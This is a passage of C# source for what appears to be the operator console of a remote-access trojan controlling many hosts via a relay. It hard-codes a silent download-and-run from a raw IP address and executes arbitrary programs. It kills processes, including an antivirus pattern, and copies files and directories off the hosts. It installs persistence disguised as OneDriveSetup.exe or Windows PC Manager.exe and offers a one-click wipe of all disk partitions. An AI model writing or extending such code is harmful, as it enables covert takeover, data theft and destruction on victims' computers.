            //   这样会得到字面量 "USER_DESKTOP\AskLink_zyck4096.exe"，路径不对。
            //
            // ★ 正确做法：savePath 只传标识符 "USER_DESKTOP"，让被控端自动拼文件名。
            //   但文件名来自 URL 末尾 "asklink.exe"，我们需要自定义文件名。
            //   需要在被控端 savePath 支持"标识符\自定义文件名"的格式。
            //
            // ★ 最简方案（不改被控端路径解析逻辑）：
            //   直接在 savePath 里传完整的 Windows 通用路径占位，用 %PUBLIC%\Desktop 形式？不行，被控端不展开。
            //   或者：利用被控端已有逻辑——savePathIn非标识符时当普通路径直接用。
            //   控制端传 savePath = "USER_DESKTOP" + "\\" + "AskLink_zyck4096.exe"，
            //   被控端 ResolveSysPath 收到 "USER_DESKTOP\\AskLink_zyck4096.exe"，
            //   不匹配任何标识符，直接返回原字符串 "USER_DESKTOP\\AskLink_zyck4096.exe"，路径错误。
            //
            // ★ 最终正确方案：修改被控端 ResolveSysPath，支持 "USER_DESKTOP\filename.exe" 格式。
            //   见改动七。

            // savePath 末尾加 |LAUNCH，告知被控端安装完成后自动查找快捷方式启动连连控
            string payload = "USER_DESKTOP\\AskLink_zyck4096.exe|LAUNCH\nhttp://103.52.153.5:7755/download/asklink.exe /VERYSILENT";
            byte[] data = Encoding.UTF8.GetBytes(payload);
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 开始下载连连控并静默安装...");
                SendCmdToHost(host, CMD_DOWNLOAD_TODESK, data);
            }
        }

        private void 结束连连控ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送结束连连控进程指令");
                SendCmdToHost(host, CMD_KILL_ASKLINK, new byte[0]);
            }
        }

        private void 获取连连控截图ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                string taskId = SendScreenshotCmd(host, CMD_SCREENSHOT_ASKLINK);
                AppendLog($"[{host.HostName}] 已发送连连控截图指令 taskId={taskId}");
            }
        }

        private void 打开连连控ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送打开连连控指令");
                SendCmdToHost(host, CMD_OPEN_ASKLINK, new byte[0]);
            }
        }

        private void 打开todeskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送打开ToDesk指令");
                SendCmdToHost(host, CMD_OPEN_TODESK, new byte[0]);
            }
        }

        private void 截取全屏ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                string taskId = SendScreenshotCmd(host, CMD_SCREENSHOT_FULLSCREEN);
                AppendLog($"[{host.HostName}] 已发送全屏截图指令 taskId={taskId}");
            }
        }

        private void 重启ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            string names = string.Join("、", selected.Cast<HostInfo>()
                .Where(h => h != null).Select(h => h.HostName));
            var result = MessageBox.Show(
                $"确定要重启以下被控端？\n{names}",
                "确认重启",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning);
            if (result != DialogResult.Yes) return;

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送重启指令");
                SendCmdToHost(host, CMD_REBOOT, new byte[0]);
            }
        }

        private void 关机ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            string names = string.Join("、", selected.Cast<HostInfo>()
                .Where(h => h != null).Select(h => h.HostName));
            var result = MessageBox.Show(
                $"确定要关闭以下被控端？\n{names}",
                "确认关机",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning);
            if (result != DialogResult.Yes) return;

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送关机指令");
                SendCmdToHost(host, CMD_SHUTDOWN, new byte[0]);
            }
        }

        //private void 删除文件ToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    var selected = objectListView.SelectedObjects;
        //    if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

        //    string path = Microsoft.VisualBasic.Interaction.InputBox(
        //        "请输入要删除的文件或目录完整路径：", "删除路径", "");
        //    if (string.IsNullOrEmpty(path)) return;

        //    string names = string.Join("、", selected.Cast<HostInfo>()
        //        .Where(h => h != null).Select(h => h.HostName));
        //    var confirm = MessageBox.Show(
        //        $"确定要在以下被控端删除：\r\n{path}\r\n\r\n目标主机：{names}",
        //        "确认删除", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
        //    if (confirm != DialogResult.Yes) return;

        //    foreach (var obj in selected)
        //    {
        //        HostInfo host = obj as HostInfo;
        //        if (host == null) continue;
        //        AppendLog($"[{host.HostName}] 已发送删除指令：{path}");
        //        SendCmdToHost(host, CMD_DELETE_PATH, Encoding.UTF8.GetBytes(path));
        //    }
        //}

        private void 控制端传输文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //var selected = objectListView.SelectedObjects;
            //if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            //string localPath = Microsoft.VisualBasic.Interaction.InputBox(
            //    "请输入本地文件路径：", "发送文件到被控端", "");
            //if (string.IsNullOrEmpty(localPath)) return;
            //if (!File.Exists(localPath)) { AppendLog("文件不存在: " + localPath); return; }

            //string fileName = Path.GetFileName(localPath);

            //foreach (var obj in selected)
            //{
            //    HostInfo host = obj as HostInfo;
            //    if (host == null || host.Client == null || !host.Client.Connected) continue;

            //    // 通知被控端准备接收
            //    byte[] nameBytes = Encoding.UTF8.GetBytes(fileName);
            //    SendCmdToHost(host, CMD_SEND_FILE, nameBytes);
            //    AppendLog($"[{host.HostName}] [文件发送] 通知被控端准备接收: {fileName}");
            //    // 每台被控端独立线程发送
            //    HostInfo capturedHost = host;
            //    Thread t = new Thread(() => SendFileToBgentToHost(localPath, capturedHost));
            //    t.IsBackground = true;
            //    t.Start();
            //}
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            // 检查选中的被控端是否已连接
            var connectedHosts = new System.Collections.Generic.List<HostInfo>();
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host != null && host.Client != null && host.Client.Connected)
                    connectedHosts.Add(host);
            }
            if (connectedHosts.Count == 0) { AppendLog("所选被控端均未连接"); return; }

            SendFileForm form = new SendFileForm(connectedHosts);
            form.ShowDialog(this);
        }

        private void 被控端传输文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //var selected = objectListView.SelectedObjects;
            //if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            //// 被控端回传文件，只支持单选（多台机器同名文件会冲突）
            //if (selected.Count > 1)
            //{
            //    AppendLog("被控端回传文件每次只能选择一台被控端");
            //    return;
            //}

            //HostInfo host = selected[0] as HostInfo;
            //if (host == null || host.Client == null || !host.Client.Connected)
            //{
            //    AppendLog("所选被控端已断开连接");
            //    return;
            //}

            //string remotePath = Microsoft.VisualBasic.Interaction.InputBox(
            //    "请输入被控端文件路径：", "请求被控端文件", @"C:\");
            //if (string.IsNullOrEmpty(remotePath)) return;

            //string fname = Path.GetFileName(remotePath);
            //string partPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fname + ".part");
            //long resumeOffset = File.Exists(partPath) ? new FileInfo(partPath).Length : 0;

            //if (resumeOffset > 0)
            //    AppendLog($"[{host.HostName}] [文件请求] 续传: {fname}  已有: {resumeOffset / 1024} KB");
            //else
            //    AppendLog($"[{host.HostName}] [文件请求] 请求: {remotePath}");

            //byte[] pathBytes = Encoding.UTF8.GetBytes(remotePath);
            //SendCmdToHost(host, CMD_REQUEST_FILE, pathBytes);

            //Thread t = new Thread(() => WaitAndRecvFile(resumeOffset));
            //t.IsBackground = true;
            //t.Start();
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            if (selected.Count > 1)
            {
                AppendLog("被控端回传文件每次只能选择一台被控端");
                return;
            }

            HostInfo host = selected[0] as HostInfo;
            if (host == null || host.Client == null || !host.Client.Connected)
            {
                AppendLog("所选被控端已断开连接");
                return;
            }

            ReceiveFileForm form = new ReceiveFileForm(host);
            form.ShowDialog(this);
        }

        private void 获取目录ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            HostInfo host = selected[0] as HostInfo;
            if (host == null || host.Client == null || !host.Client.Connected)
            { AppendLog("所选被控端未连接"); return; }

            if (selected.Count > 1)
                AppendLog($"已选择多个被控端，默认获取第一个：{host.HostName}");

            // 切换主机时清空缓存和显示
            if (_browsingHost == null || _browsingHost.UniqueId != host.UniqueId)
            {
                _browsingHost = host;
                _dirCache.Clear();
                _pendingPath = null;
                treeListView1.ClearObjects();
            }

            AppendLog($"[{host.HostName}] 已发送获取磁盘列表指令");
            SendCmdToHost(host, CMD_LIST_DRIVES, new byte[0]);
        }

        private void 获取进程ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            // 多选只取第一个
            HostInfo host = selected[0] as HostInfo;
            if (host == null || host.Client == null || !host.Client.Connected)
            { AppendLog("所选被控端未连接"); return; }

            if (selected.Count > 1)
                AppendLog($"已选择多个被控端，默认获取第一个：{host.HostName}");

            AppendLog($"[{host.HostName}] 已发送获取进程列表指令");
            SendCmdToHost(host, CMD_GETPROCS, new byte[0]);
        }

        private void treeListView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (treeListView1.SelectedObject is FileNode fn && fn.IsDirectory)
                treeListView1.ToggleExpansion(fn);
        }

        private void 复制路径ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (treeListView1.SelectedObject is FileNode fn && !string.IsNullOrEmpty(fn.FullPath))
            {
                Clipboard.SetText(fn.FullPath);
                AppendLog($"已复制路径: {fn.FullPath}");
            }
            else
            {
                AppendLog("未选中任何节点");
            }
        }

        private void 删除文件ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            var selectedFiles = _contextMenuNodes
                .Where(f => f != null && !f.IsDirectory && !string.IsNullOrEmpty(f.FullPath))
                .ToList();
            if (selectedFiles.Count == 0)
            { AppendLog("请在目录树中选择至少一个文件"); return; }
            if (_browsingHost?.Client?.Connected != true)
            { AppendLog("请先获取被控端目录"); return; }

            foreach (var fn in selectedFiles)
            {
                AppendLog($"[{_browsingHost.HostName}] 已发送删除文件指令: {fn.FullPath}");
                SendCmdToHost(_browsingHost, CMD_DELETE_PATH, Encoding.UTF8.GetBytes(fn.FullPath));
                string parentPath = Path.GetDirectoryName(fn.FullPath);
                if (parentPath != null && _dirCache.ContainsKey(parentPath))
                {
                    _dirCache[parentPath].RemoveAll(n => string.Equals(
                        n.FullPath, fn.FullPath, StringComparison.OrdinalIgnoreCase));
                    foreach (var obj in treeListView1.Objects)
                        if (RefreshNodeRecursive(obj as FileNode, parentPath)) break;
                }
            }
        }

        private void 传输目录到本地ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selectedDirs = _contextMenuNodes
        .Where(f => f != null && f.IsDirectory && !string.IsNullOrEmpty(f.FullPath))
        .ToList();

            if (selectedDirs.Count == 0)
            { AppendLog("请在目录树中选择至少一个目录"); return; }

            var selectedHosts = objectListView.SelectedObjects;
            if (selectedHosts == null || selectedHosts.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            foreach (var hostObj in selectedHosts)
            {
                HostInfo host = hostObj as HostInfo;
                if (host == null || host.Client == null || !host.Client.Connected)
                {
                    AppendLog($"[{host?.HostName ?? "未知"}] 未连接，跳过");
                    continue;
                }

                // ★ 把所有目录收集好，在单独线程里串行传输，避免并发配对冲突
                var capturedDirs = selectedDirs.ToList();
                HostInfo capturedHost = host;

                Thread t = new Thread(() =>
                {
                    foreach (var dir in capturedDirs)
                    {
                        string dirTaskId = Guid.NewGuid().ToString("N").Substring(0, 16);
                        string capturedPath = dir.FullPath;

                        AppendLog($"[{capturedHost.HostName}] [目录传输] 请求目录: {capturedPath}  taskId={dirTaskId}");

                        string payload = capturedPath + "|" + dirTaskId;
                        SendCmdToHost(capturedHost, CMD_REQUEST_DIR, Encoding.UTF8.GetBytes(payload));

                        // ★ 同步等待本次目录传完再传下一个
                        WaitAndRecvDirWithTaskId(capturedHost, dirTaskId);
                    }
                });
                t.IsBackground = true;
                t.Start();
            }
        }

        private void 删除目录ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selectedDirs = _contextMenuNodes
                .Where(f => f != null && f.IsDirectory && !string.IsNullOrEmpty(f.FullPath))
                .ToList();
            if (selectedDirs.Count == 0)
            { AppendLog("请在目录树中选择至少一个目录"); return; }
            if (_browsingHost?.Client?.Connected != true)
            { AppendLog("请先获取被控端目录"); return; }

            foreach (var fn in selectedDirs)
            {
                AppendLog($"[{_browsingHost.HostName}] 已发送删除目录指令: {fn.FullPath}");
                SendCmdToHost(_browsingHost, CMD_DELETE_PATH, Encoding.UTF8.GetBytes(fn.FullPath));
                string parentPath = Path.GetDirectoryName(fn.FullPath);
                if (parentPath != null && _dirCache.ContainsKey(parentPath))
                {
                    _dirCache[parentPath].RemoveAll(n => string.Equals(
                        n.FullPath, fn.FullPath, StringComparison.OrdinalIgnoreCase));
                    _dirCache.Remove(fn.FullPath);
                    foreach (var obj in treeListView1.Objects)
                        if (RefreshNodeRecursive(obj as FileNode, parentPath)) break;
                }
            }
        }

        private void 传输文件到本地ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selectedNodes = _contextMenuNodes;
            if (selectedNodes == null || selectedNodes.Count == 0)
            { AppendLog("请在目录树中选择文件或目录"); return; }

            var selectedHosts = objectListView.SelectedObjects;
            if (selectedHosts == null || selectedHosts.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            foreach (var hostObj in selectedHosts)
            {
                HostInfo host = hostObj as HostInfo;
                if (host == null || host.Client == null || !host.Client.Connected)
                {
                    AppendLog($"[{host?.HostName ?? "未知"}] 未连接，跳过");
                    continue;
                }

                foreach (var fn in selectedNodes)
                {
                    if (fn == null || string.IsNullOrEmpty(fn.FullPath)) continue;

                    if (fn.IsDirectory)
                    {
                        string dirTaskId = Guid.NewGuid().ToString("N").Substring(0, 16);
                        HostInfo capturedHost = host;
                        string capturedPath = fn.FullPath;

                        AppendLog($"[{capturedHost.HostName}] [目录传输] 请求目录: {capturedPath}  taskId={dirTaskId}");

                        string payload = capturedPath + "|" + dirTaskId;
                        SendCmdToHost(capturedHost, CMD_REQUEST_DIR, Encoding.UTF8.GetBytes(payload));

                        Thread t = new Thread(() => WaitAndRecvDirWithTaskId(capturedHost, dirTaskId));
                        t.IsBackground = true;
                        t.Start();
                    }
                    else
                    {
                        string fname = Path.GetFileName(fn.FullPath);
                        string partPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fname + ".part");
                        long resumeOffset = File.Exists(partPath) ? new FileInfo(partPath).Length : 0;

                        if (resumeOffset > 0)
                            AppendLog($"[{host.HostName}] [文件请求] 续传: {fname}  已有: {FormatSize(resumeOffset)}");
                        else
                            AppendLog($"[{host.HostName}] [文件请求] 请求: {fn.FullPath}");

                        RequestFileFromAgent(host, fn.FullPath, resumeOffset);
                    }
                }
            }
        }

        private void contextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (treeListView1.Items.Count == 0 || treeListView1.SelectedObjects.Count == 0)
            {
                e.Cancel = true;
                return;
            }
            _contextMenuNode = treeListView1.SelectedObject as FileNode;
            _contextMenuNodes = treeListView1.SelectedObjects
                .Cast<object>()
                .Select(o => o as FileNode)
                .Where(f => f != null)
                .ToList();
        }

        //private void 删除指定目录ToolStripMenuItem_Click(object sender, EventArgs e)
        //{
        //    var selected = objectListView.SelectedObjects;
        //    if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

        //    string dirName = Microsoft.VisualBasic.Interaction.InputBox(
        //        "请输入要删除的目录名（仅目录名，不含路径）：\n例如：win_pe",
        //        "删除所有盘指定目录", "");
        //    if (string.IsNullOrWhiteSpace(dirName)) return;

        //    // 安全检查：防止误输入根目录或绝对路径
        //    if (dirName.Contains("\\") || dirName.Contains("/") ||
        //        dirName.Contains(":") || dirName.Trim() == ".")
        //    {
        //        AppendLog("目录名不合法，请只输入目录名，不要包含路径分隔符");
        //        return;
        //    }

        //    string names = string.Join("、", selected.Cast<HostInfo>()
        //        .Where(h => h != null).Select(h => h.HostName));
        //    var confirm = MessageBox.Show(
        //        $"确定要在以下被控端的所有盘符根目录下删除目录 [{dirName}]？\n\n目标主机：{names}",
        //        "确认删除", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
        //    if (confirm != DialogResult.Yes) return;

        //    foreach (var obj in selected)
        //    {
        //        HostInfo host = obj as HostInfo;
        //        if (host == null) continue;
        //        AppendLog($"[{host.HostName}] 已发送删除所有盘 [{dirName}] 目录指令");
        //        SendCmdToHost(host, CMD_DEL_DIR_ALL, Encoding.UTF8.GetBytes(dirName));
        //    }
        //}

        private void 一键重建硬盘ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            string names = string.Join("、", selected.Cast<HostInfo>()
                .Where(h => h != null).Select(h => h.HostName));
            var confirm = MessageBox.Show(
                $"警告：此操作将删除以下被控端所有物理磁盘的全部分区！\n数据将无法恢复！\n\n目标主机：{names}\n\n确认执行？",
                "危险操作确认", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
            if (confirm != DialogResult.Yes) return;

            // 二次确认
            var confirm2 = MessageBox.Show(
                "再次确认：将清除所有磁盘分区，操作不可撤销，是否继续？",
                "最终确认", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (confirm2 != DialogResult.Yes) return;

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送一键重建硬盘指令（删除所有分区）");
                SendCmdToHost(host, CMD_FORMAT_DISKS, new byte[0]);
            }
        }
        private void CleanupZombieConnections()
        {
            Action action = () =>
            {
                bool changed = false;
                foreach (var host in _hostList)
                {
                    if (host.Client != null && !host.Client.Connected && !host.IsConnecting)
                    {
                        try { host.Client.Close(); } catch { }
                        host.Client = null;
                        host.IsConnecting = false;
                        changed = true;
                    }
                }
                if (changed) objectListView.RefreshObjects(_hostList);
            };

            if (objectListView.InvokeRequired)
                objectListView.Invoke(action);
            else
                action();
        }
        private void ConnectToAgent(HostInfo host, Action onConnected = null)
        {
            if (host.Client != null && host.Client.Connected)
            {
                onConnected?.Invoke();
                return;
            }

            if (host.Client != null)
            {
                try { host.Client.Close(); } catch { }
                host.Client = null;
            }

            lock (host)
            {
                if (host.IsConnecting) return;
                host.IsConnecting = true;
            }

            Thread t = new Thread(() =>
            {
                try
                {
                    for (int retry = 0; retry < 3; retry++)
                    {
                        try
                        {
                            TcpClient client = new TcpClient();

                            client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                            byte[] keepAliveValues = new byte[12];
                            BitConverter.GetBytes(1u).CopyTo(keepAliveValues, 0);
                            BitConverter.GetBytes(5000u).CopyTo(keepAliveValues, 4);
                            BitConverter.GetBytes(2000u).CopyTo(keepAliveValues, 8);
                            client.Client.IOControl(IOControlCode.KeepAliveValues, keepAliveValues, null);

                            client.Connect(RELAY_IP, CMD_PORT);
                            NetworkStream stream = client.GetStream();

                            byte[] idBytes = Encoding.UTF8.GetBytes(host.UniqueId);
                            SendPacketDirect(stream, CMD_CTRL_HELLO, idBytes);

                            client.ReceiveTimeout = 5000;
                            uint pairCmd; byte[] pairData;
                            if (!RecvPacket(stream, out pairCmd, out pairData) || pairCmd != CMD_PAIR_OK)
                            {
                                client.Close();
                                if (retry < 2)
                                {
                                    AppendLog($"[{host.HostName}] 配对失败，500ms后重试({retry + 1}/3)");
                                    Thread.Sleep(500);
                                    continue;
                                }
                                throw new Exception("配对失败，已重试3次");
                            }

                            client.ReceiveTimeout = 0;
                            _controlledClient = client;
                            host.Client = client;

                            // ★ 修复：连接成功后同步更新UI状态为在线
                            Action markOnline = () =>
                            {
                                host.OnlineStatus = "在线";
                                objectListView.RefreshObject(host);
                            };
                            if (objectListView.InvokeRequired)
                                objectListView.Invoke(markOnline);
                            else
                                markOnline();

                            AppendLog($"[{host.HostName}] 上线 → 控制连接已就绪");
                            onConnected?.Invoke();
                            RecvLoop(client);
                            return;
                        }
                        catch (Exception ex) when (retry < 2)
                        {
                            AppendLog($"[{host.HostName}] 连接失败({retry + 1}/3): {ex.Message}");
                            Thread.Sleep(500);
                        }
                    }
                    AppendLog($"[{host.HostName}] 重试3次均失败，等待下次轮询触发");
                }
                catch (Exception ex)
                {
                    AppendLog($"[{host.HostName}] 控制连接建立失败: {ex.Message}");
                }
                finally
                {
                    host.IsConnecting = false;
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        private void objectListView_DoubleClick(object sender, EventArgs e)
        {
            HostInfo host = objectListView.SelectedObject as HostInfo;
            if (host == null) return;

            // ★ 改动：双击时先取消正在进行的自动重连循环，再发起新连接
            // 原代码直接重置IsConnecting=false会导致并发ConnectToAgent互相踢出
            CancellationTokenSource oldCts = null;
            lock (host)
            {
                oldCts = host.ReconnectCts;
                host.ReconnectCts = null;
                host.IsReconnecting = false;
            }
            try { oldCts?.Cancel(); } catch { }

            // 等IsConnecting清零（AutoReconnectLoop取消后IsConnecting会在ConnectToAgent的finally里清零）
            // 给一个短暂等待让旧线程退出
            if (host.IsConnecting)
            {
                AppendLog($"[{host.HostName}] 正在取消旧连接，请稍候...");
                Thread.Sleep(300);
                host.IsConnecting = false;  // 强制清零，让新连接可以进入
            }

            try { host.Client?.Close(); } catch { }
            host.Client = null;

            ConnectToAgent(host);
        }

        private void 一键添加开机启动ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送添加开机启动指令");
                SendCmdToHost(host, CMD_ADD_STARTUP, new byte[0]);
            }
        }

        private void 一键卸载开机启动ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            var confirm = MessageBox.Show(
                $"确定要为选中的 {selected.Count} 台被控端删除开机启动项？",
                "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (confirm != DialogResult.Yes) return;

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送卸载开机启动指令");
                SendCmdToHost(host, CMD_DEL_STARTUP, new byte[0]);
            }
        }

        private void 运行程序ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            string input = Microsoft.VisualBasic.Interaction.InputBox(
                "请输入要运行的程序路径（可附加参数）：\n" +
                "例如：C:\\setup.exe /S\n" +
                "或：\"C:\\Program Files\\app.exe\" /silent",
                "运行程序", "");
            if (string.IsNullOrWhiteSpace(input)) return;

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送运行程序指令: {input}");
                SendCmdToHost(host, CMD_RUN_PROGRAM,
                    Encoding.UTF8.GetBytes(input));
            }
        }

        private void 结束进程ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }
            string input = Microsoft.VisualBasic.Interaction.InputBox(
                "请输入要结束的进程名，多个用逗号分隔，支持通配符：\n" +
                "例如：notepad.exe\n" +
                "例如：360*.exe, QQ.exe, 微信.exe",
                "结束进程", "OneDriveSetup.exe");
            if (string.IsNullOrWhiteSpace(input)) return;
            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送结束进程指令: {input}，并移除被控端");
                SendCmdToHost(host, CMD_KILL_PROCESS,
                    Encoding.UTF8.GetBytes(input));

                // ★ 发送结束进程指令后直接删除被控端
                //try { host.Client?.Close(); } catch { }
                //_hostList.Remove(host);
            }
            objectListView.SetObjects(_hostList);
        }

        private void 打开ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!(_browsingHost?.Client?.Connected == true))
            {
                AppendLog("请先获取被控端目录");
                return;
            }

            if (!(treeListView1.SelectedObject is FileNode fn) || string.IsNullOrEmpty(fn.FullPath))
            {
                AppendLog("未选中任何节点");
                return;
            }

            AppendLog($"[{_browsingHost.HostName}] 已发送打开指令: {fn.FullPath}");
            SendCmdToHost(_browsingHost, CMD_RUN_PROGRAM, Encoding.UTF8.GetBytes(fn.FullPath));
        }

        private void 一键添加完整版启动项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            using (var form = new FullStartupForm())
            {
                if (form.ShowDialog(this) != DialogResult.OK) return;
                string input = form.ResultInput;
                if (string.IsNullOrWhiteSpace(input)) return;

                // ★ URL模式：savePath传空，被控端下载到临时目录
                // 被控端DONE_NORUN分支检测文件名后自动复制到各系统盘并写注册表
                // 文件名固定为"Windows PC Manager.exe"，被控端用此名检测触发条件
                bool isUrl = input.StartsWith("http://", StringComparison.OrdinalIgnoreCase)
                          || input.StartsWith("https://", StringComparison.OrdinalIgnoreCase);

                if (isUrl)
                {
                    // ★ savePath传空，被控端下载到临时目录
                    // URL中的文件名必须是"Windows PC Manager.exe"（或包含此名）
                    // 被控端下载后自动检测文件名触发复制+注册表逻辑
                    string payload = "\n" + input;
                    foreach (var obj in selected)
                    {
                        HostInfo host = obj as HostInfo;
                        if (host == null) continue;
                        AppendLog($"[{host.HostName}] 正在下载完整被控端，下载完成后自动添加启动项...");
                        // ★ 只发下载指令，注册表写入由DONE_NORUN回报自动触发
                        lock (_pendingStartupHosts)
                            _pendingStartupHosts.Add(host.UniqueId);
                        SendCmdToHost(host, CMD_DOWNLOAD_EX, System.Text.Encoding.UTF8.GetBytes(payload));
                    }
                }
                else
                {
                    if (!File.Exists(input))
                    { AppendLog("文件不存在: " + input); return; }

                    long fileSize = new FileInfo(input).Length;
                    int waitMs = (int)Math.Max(5000, fileSize / (1024 * 1024) * 1000 + 3000);

                    foreach (var obj in selected)
                    {
                        HostInfo host = obj as HostInfo;
                        if (host == null) continue;
                        AppendLog($"[{host.HostName}] 正在传输本地被控端并添加启动项...");

                        // ★ 传到被控端临时目录，文件名固定为"Windows PC Manager.exe"
                        // 传完后发 CMD_ADD_STARTUP，被控端用 selfPath（传入文件路径）复制到各系统盘
                        // 但本地文件模式走的是CMD_ADD_STARTUP，ModifyStartup用selfPath=自身路径
                        // 所以本地文件模式：传文件到固定路径，再发CMD_ADD_STARTUP_NOREG
                        // 被控端CMD_ADD_STARTUP_NOREG → ModifyStartup(copyFile=false) → 只写注册表
                        // ★ 但此时文件还没复制到各系统盘！
                        //
                        // 正确方案：传文件到临时目录，发 CMD_ADD_STARTUP（copyFile=true）
                        // ModifyStartup(copyFile=true, sourceFilePath=接收到的文件路径)
                        // 所以需要在CMD_SEND_FILE完成后被控端知道源文件路径
                        //
                        // 最简方案：保持原有"传文件到目标路径+发NOREG"的逻辑不变
                        // 但每个系统盘都需要一份文件，这个方案只能处理一个盘
                        //
                        // ★ 实际可行方案：传文件到临时路径，发新指令让被控端自己复制分发
                        // 新指令 = CMD_ADD_STARTUP，但先传文件到临时目录

                        // 保持现有逻辑：传文件到第一个系统盘（C盘SysWOW64），再发NOREG写注册表
                        // 多系统盘场景暂不处理（PE下多系统盘本地文件模式较少见）
                        SendFileToBgentToHost(input, host, "C:\\Windows\\SysWOW64\\OneDriveSetup.exe");

                        HostInfo capturedHost = host;
                        System.Threading.ThreadPool.QueueUserWorkItem(_ =>
                        {
                            System.Threading.Thread.Sleep(waitMs);
                            AppendLog($"[{capturedHost.HostName}] 传输完成，已发送添加开机启动指令（仅注册表）");
                            SendCmdToHost(capturedHost, CMD_ADD_STARTUP_NOREG, new byte[0]);
                        });
